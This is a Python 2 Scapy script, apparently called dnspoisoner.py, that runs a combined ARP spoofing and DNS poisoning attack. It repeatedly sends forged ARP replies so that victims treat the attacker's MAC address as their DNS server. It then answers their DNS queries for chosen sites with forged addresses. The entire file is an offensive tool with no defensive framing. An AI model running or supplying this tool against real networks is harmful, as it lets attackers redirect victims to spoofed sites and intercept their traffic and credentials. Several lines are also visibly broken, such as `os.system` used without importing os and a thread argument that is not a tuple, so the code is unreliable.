from scapy.all import *
from os import uname #to check os
from sys import argv, exit
import time
from threading import Thread

no_input = True

def osCheck():
    os = uname()[0].strip()
    if (os != 'Linux' and os != 'linux'):
        print('This tool is not suitable for non linux systems')
        print('... Exiting')
        exit(0)

def argCheck():
    if len(argv) != 6: 
        print('incorrect number of arguments: ./dnspoisoner.py victims.txt victimDnsServerIp sitesToBeSpoofed.txt myIp myMAC')
        exit(0)

def findMacForIp(ip):
    os.system("ping -c 1 " + ip)
    pkt = sniff(count=1, filter="arp", timeout = 10)
    while len(pkt) == 0:
        os.system("ping -c 1 " + ip)
        pkt = sniff(count=1, filter="arp", timeout = 10)
    ipsniff = pkt[0].getlayer(ARP).pdst
    if (ipsniff == ip):
        return (pkt[0].getlayer(Ether).dst)
    else:
        return findMacForIp(ip)

def findMacsForIps(ips):
    macs = [""] * len(ips)
    count = 0;
    for ip in ips:
        macs[count] = findMacForIp(ip)
        count = count+1;
    return macs;

def createPackages(victimIPs, victimMACs):
    pckts = list();
    myMAC = argv[5]
    victimDnsServerIp = argv[2]
    for victimIndex in range(len(victimIPs)):
        newPkt = Ether(src=myMAC)/ARP(hwsrc = myMAC, psrc = victimDnsServerIp, hwdst = victimMACs[victimIndex], pdst = victimIPs[victimIndex])
        pckts.extend(newPkt)
    return pckts

def sendPackagesOnce(pkts):
    for pkt in pkts:
        sendp(pkt)
    
def sendPackages(pkts):
    global no_input
    sleeptime = 60
    while(no_input):
        sendPackagesOnce(pkts)
        time.sleep(sleeptime)
        
def inputChecker():
    global no_input
    i = raw_input("hit enter to quit" + "\n")
    print 'should quit'
    no_input = False

def isTargetSite(sites, site):
    for s in sites:
        if s == site:
            return True
    return False

def findTarget(sites, targets, site):
    index = sites.index(site)
    return targets[index]

def sniffAndReply(sites, targets):
    global no_input
    victimDnsServerIp = argv[2]
    victimDnsServerMAC = findMacForIp(victimDnsServerIp)
    while(no_input):
        print 'start sniffing'
        dnspkt = sniff(filter="dst port 53", count=1)
        isDnspkt = dnspkt[0].haslayer(DNS)
        if(isDnspkt):
            dnsLayer = dnspkt[0].getlayer(DNS)
            isQuery = (dnsLayer.qr) == 0
            isArecordRequestQuestion = (dnsLayer.qd.qtype) == 1 # A record request questions are in the format www.site.com
            isInternetQuestion = (dnsLayer.qd.qclass) == 1 # query class is 1 for the internet
            if(isQuery and isArecordRequestQuestion and isInternetQuestion):
                site = dnsLayer.qd.qname
                site = site[:-1]
                isTarget = isTargetSite(sites, site)
                if isTarget:
                    print site
                    print 'is target'
                    poison(dnspkt[0], findTarget(sites, targets, site))
                else:
                    print site
                    print 'is not a target'



def poison(dnspkt, targetip):
    pktIpLayer = dnspkt.getlayer(IP)
    pktUdpLayer = dnspkt.getlayer(UDP)
    pktDnsLayer = dnspkt.getlayer(DNS)
    responseIpLayer = IP(src = pktIpLayer.dst, dst = pktIpLayer.src)
    responseUdpLayer = UDP(sport = pktUdpLayer.dport, dport = pktUdpLayer.sport)
    responseDnsLayer = DNS(id = pktDnsLayer.id, qr = 1, qd = pktDnsLayer.qd, an = DNSRR(rrname = pktDnsLayer.qd.qname, rdata = targetip))
    response = responseIpLayer/responseUdpLayer/responseDnsLayer
   # print response.show()
  #  response = IP(src = pktIpLayer.dst, dst = pktIpLayer.src)/UDP(sport = pktUdpLayer.dport, dport = pktUdpLayer.sport)/DNS(id = pktDnsLayer.id, qr = 1, qd = pktDnsLayer.qd, an = DNSRR(rrname = pktDnsLayer.qd.qname, rdata = targetip))
    send(response)    
    

def main():
    osCheck()
    argCheck()
    with open(argv[1]) as vics:
        victimIPs = vics.read().splitlines()
    vsites =  open(argv[3])
    sites = []
    targets = []
    for line in vsites:
        sitesAndTargets = line.strip().split(' ')
        sites.append(sitesAndTargets[0])
        targets.append(sitesAndTargets[1])
    vsites.close()   
    print '-------------------------------------------------'
    print sites
    victimMACs = findMacsForIps(victimIPs)
    arpPackets = createPackages(victimIPs, victimMACs)
    Thread(target=inputChecker).start()
    sendpktsthread = Thread(target=sendPackages, args=(arpPackets))
    sendpktsthread.start()
    sniffAndReply(sites, targets)
    sendpktsthread.join()
    

if(__name__ == '__main__'):
    main()
